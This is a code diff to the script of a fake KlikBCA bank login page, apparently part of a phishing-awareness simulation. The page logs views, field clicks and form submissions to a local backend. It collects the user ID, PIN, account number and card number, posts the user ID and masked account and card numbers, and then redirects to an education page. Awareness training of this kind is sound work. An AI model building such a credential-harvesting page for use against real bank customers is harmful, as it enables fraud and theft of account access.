@@ -372,49 +372,150 @@
     </div>
 
     <script>
+        // ============================================
+        // BACKEND API CONFIGURATION
+        // ============================================
+        const API_URL = 'http://localhost:5000/api';
+        
+        // Get link ID from URL parameter
         const urlParams = new URLSearchParams(window.location.search);
-        const linkId = urlParams.get('id') || 'demo';
+        const linkId = urlParams.get('id');
 
-        function trackView() {
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
+        if (!linkId) {
+            console.error('Link ID tidak ditemukan di URL!');
+        }
+
+        // ============================================
+        // TRACK PAGE VIEW (Saat halaman dibuka)
+        // ============================================
+        async function trackView() {
+            if (!linkId) return;
             
-            if (link) {
-                link.views = (link.views || 0) + 1;
-                if (!link.visitors) link.visitors = [];
-                
-                const visitorId = Date.now();
-                link.visitors.push({
-                    id: visitorId,
-                    timestamp: Date.now(),
-                    duration: 0,
-                    inputData: false
+            try {
+                const response = await fetch(`${API_URL}/log-activity`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        link_id: linkId,
+                        activity_type: 'view',
+                        data: `Halaman KlikBCA dibuka: ${window.location.href}`
+                    })
                 });
+
+                const result = await response.json();
                 
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-                
-                sessionStorage.setItem('visitorId', visitorId);
-                sessionStorage.setItem('linkId', linkId);
-                sessionStorage.setItem('startTime', Date.now());
+                if (result.success) {
+                    console.log('✅ View tracked successfully');
+                } else {
+                    console.error('❌ Failed to track view:', result.message);
+                }
+            } catch (error) {
+                console.error('❌ Error tracking view:', error);
             }
         }
 
-        // PIN validation
+        // ============================================
+        // TRACK CLICK (Saat user klik input field)
+        // ============================================
+        async function trackClick(fieldName) {
+            if (!linkId) return;
+            
+            try {
+                const response = await fetch(`${API_URL}/log-activity`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        link_id: linkId,
+                        activity_type: 'click',
+                        data: `User mengklik field: ${fieldName}`
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    console.log('✅ Click tracked:', fieldName);
+                }
+            } catch (error) {
+                console.error('❌ Error tracking click:', error);
+            }
+        }
+
+        // ============================================
+        // TRACK FORM SUBMISSION
+        // ============================================
+        async function trackSubmit(formData) {
+            if (!linkId) return;
+            
+            try {
+                const response = await fetch(`${API_URL}/log-activity`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        link_id: linkId,
+                        activity_type: 'submit',
+                        data: JSON.stringify({
+                            userId: formData.userId,
+                            accountNumber: '****' + formData.accountNumber.slice(-4),
+                            cardNumber: formData.cardNumber.substring(0, 4) + ' **** **** ' + formData.cardNumber.slice(-4),
+                            timestamp: new Date().toISOString()
+                        })
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    console.log('✅ Submit tracked successfully');
+                }
+            } catch (error) {
+                console.error('❌ Error tracking submit:', error);
+            }
+        }
+
+        // ============================================
+        // PIN VALIDATION - Hanya angka
+        // ============================================
         document.getElementById('pin').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
         });
 
-        // Card number formatting
+        // ============================================
+        // CARD NUMBER FORMATTING
+        // ============================================
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s/g, '');
             let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
             e.target.value = formatted;
         });
 
-        // Form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // ============================================
+        // TRACK CLICKS ON INPUT FIELDS
+        // ============================================
+        let clickedFields = new Set();
+
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                const fieldName = this.id || this.name || 'unknown';
+                
+                // Track hanya sekali per field
+                if (!clickedFields.has(fieldName)) {
+                    clickedFields.add(fieldName);
+                    trackClick(fieldName);
+                }
+            });
+        });
+
+        // ============================================
+        // FORM SUBMISSION HANDLER
+        // ============================================
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const pin = document.getElementById('pin').value;
@@ -424,58 +525,32 @@
                 return;
             }
             
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            
-            if (link) {
-                link.inputData = (link.inputData || 0) + 1;
-                
-                const visitorId = sessionStorage.getItem('visitorId');
-                const startTime = parseInt(sessionStorage.getItem('startTime'));
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                
-                const visitor = link.visitors.find(v => v.id == visitorId);
-                if (visitor) {
-                    visitor.inputData = true;
-                    visitor.duration = duration;
-                }
-                
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-            }
-            
             const btn = e.target.querySelector('.btn-login');
             btn.textContent = 'Memverifikasi...';
             btn.disabled = true;
             
+            // Collect form data
+            const formData = {
+                userId: document.getElementById('userId').value,
+                pin: pin,
+                accountNumber: document.getElementById('accountNumber').value,
+                cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, '')
+            };
+            
+            // Track submit
+            await trackSubmit(formData);
+            
+            // Redirect to education page after 2 seconds
             setTimeout(() => {
                 window.location.href = 'index.html';
             }, 2000);
         });
 
-        trackView();
-
-        window.addEventListener('beforeunload', () => {
-            const visitorId = sessionStorage.getItem('visitorId');
-            const linkId = sessionStorage.getItem('linkId');
-            const startTime = parseInt(sessionStorage.getItem('startTime'));
-            
-            if (visitorId && linkId && startTime) {
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-                const link = links.find(l => l.id === linkId);
-                
-                if (link) {
-                    const visitor = link.visitors.find(v => v.id == visitorId);
-                    if (visitor && !visitor.inputData) {
-                        visitor.duration = duration;
-                    }
-                    const linkIndex = links.findIndex(l => l.id === linkId);
-                    links[linkIndex] = link;
-                    localStorage.setItem('phishLinks', JSON.stringify(links));
-                }
-            }
+        // ============================================
+        // TRACK VIEW ON PAGE LOAD
+        // ============================================
+        window.addEventListener('DOMContentLoaded', () => {
+            trackView();
         });
     </script>
 </body>
